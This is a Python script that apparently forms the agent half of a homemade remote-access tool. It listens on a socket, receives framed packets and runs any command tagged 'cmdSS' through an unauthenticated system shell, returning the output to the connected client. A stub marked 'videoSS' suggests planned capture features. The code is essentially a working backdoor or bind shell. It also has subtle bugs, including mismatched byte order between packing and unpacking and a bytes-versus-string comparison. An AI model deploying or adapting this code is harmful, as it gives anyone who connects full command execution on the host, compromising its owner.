from re import match
import subprocess
import socket, sys
import struct, math
from threading import Thread
import socket

PACKET_SIZE = 1024

def connectSocket(HOST, PORT, debug: bool = False) -> socket:
    try:
        sckt = socket.socket(socket.AF_INET)
        if debug: 
            print('[+] Server Started')
            print('[+] Listening For Client Connection ...')
        sckt.bind((HOST, PORT))
        sckt.listen(1)
        client, client_addr = sckt.accept()
        if debug:
            print(f'[+] {client_addr} Client connected to the server')   
        return client
    except (Exception): 
        return

def sendPackets(sckt: socket, dataToSend: bytearray, debug: bool, dataType: int):
    try:
        numberOfPacketsToSend = math.ceil(len(dataToSend) / PACKET_SIZE)
        bytesSent = 0
        
        for i in range(numberOfPacketsToSend):
            packetHeaderLength = min(PACKET_SIZE, len(dataToSend)-bytesSent).to_bytes(4, "big")
            packetHeaderPackets = (numberOfPacketsToSend-(i+1)).to_bytes(1, "big")
            packetPayload = dataToSend[i*PACKET_SIZE:(i*PACKET_SIZE)+min(PACKET_SIZE, len(dataToSend)-bytesSent)]
            packetDataType = dataType.to_bytes(1, "big")
            packet = packetHeaderLength + packetHeaderPackets + packetDataType + packetPayload
            bytesSent += min(PACKET_SIZE, len(dataToSend)-bytesSent)
            sckt.sendall(packet)
            if debug:
                print("packet: ", packetHeaderLength, packetHeaderPackets, packetPayload)
    except (Exception):
        return

def recvAll(sckt, n: int, debug: bool = False) -> bytearray:
    try:
        dati = bytearray()
        chunk_size = PACKET_SIZE
        if n < chunk_size:
            chunk_size = n
        while len(dati) < n:
            pckt = sckt.recv(min([chunk_size, n-len(dati)]))
            if not pckt:
                return None
            dati.extend(pckt)
        # DEBUG
        if debug:
            print(dati)
        return dati
    except (Exception):
        return b'EXIT0x02'
        
def recvMsg(sckt) -> bytearray:
    try:
        packetHeader = recvAll(sckt, 5)
        if not packetHeader or packetHeader == "EXIT0x02":
            return None
        msg_len = struct.unpack("i", packetHeader[:4])[0]
        nOfPackets = packetHeader[4]
        print("packetH", packetHeader)
        if nOfPackets > 1:
            return recvPackets(sckt, packetHeader)
        else:
            return recvAll(sckt, msg_len)
    except:
        return b"EXIT0x02"

def recvPackets(sckt: socket, packetHeader: bytearray, debug: bool = False) -> bytearray:
    try:
        dataReceived = b""

        if packetHeader == b"EXIT0x02":
                return b"EXIT0x02"

        msg_len = struct.unpack("i", packetHeader[:4])[0]
        nOfPacketsLeft = packetHeader[4]
        payload = recvAll(sckt, msg_len, False)
        dataReceived += (payload)
        if debug:
            print("payload: ", dataReceived)
        
        while nOfPacketsLeft > 0:
            packetHeader = recvAll(sckt, 5)
            if not packetHeader:
                return b"EXIT0x02"
            msg_len = struct.unpack("i", packetHeader[:4])[0]
            nOfPacketsLeft = packetHeader[4]
            payload = recvAll(sckt, msg_len) 
            dataReceived += (payload)
        
        return dataReceived
    except:
        return b"EXIT0x02"



def comunicazione(HOST, PORT, debug: bool = False):
    clientSocket = connectSocket(HOST, PORT, True)
    while 1:
        try:
            command = recvMsg(clientSocket).decode()
        except:
            command = "EXIT0x02"

        # DEBUG
        if debug and not command == "":
            print("command: ", command)

        if command == "EXIT0x01":
            sys.exit(0)
        if command == "EXIT0x02":
            clientSocket = connectSocket(HOST, PORT, True)      

        if "cmdSS" in command:
            output = subprocess.run(command.replace("cmdSS", ""), shell=True, capture_output=True)
            sendPackets(clientSocket, output.stdout, True, 99)
            # DEBUG
            if debug and not output.stdout == "":
                print(output.stdout)

        if "videoSS" in command:
            pass



